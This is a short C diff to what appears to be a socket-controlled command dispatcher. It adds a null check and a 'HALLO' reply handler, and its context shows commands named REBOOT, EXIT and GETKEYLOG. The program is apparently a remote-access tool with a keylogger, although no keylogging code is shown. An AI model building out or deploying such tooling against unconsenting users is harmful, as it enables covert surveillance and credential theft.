@@ -17,9 +17,10 @@ void inisialisasi(box cmd){
 
 void proccess(char * syntax, void * param, box cmd){
 	for(int i = 0; i < 10; i++){
+		if(cmd[i].syntax == NULL) continue;
 		if(strcmp(cmd[i].syntax, syntax) == 0){
 			cmd[i].procedure(param);
-			break;
+			return;
 		}
 	}
 
@@ -52,6 +53,14 @@ void REBOOT(void * param){
 
 void EXIT(void * param){
 	exit(0);
+}
+
+void HALLO(void * paramT){
+	if(paramT == NULL) return;
+
+	paramThread * param = (paramThread *)paramT;
+
+	send((param)->clientSocket, "HALLO", 6, 0);
 }
 
 void GETKEYLOG(void * paramT){
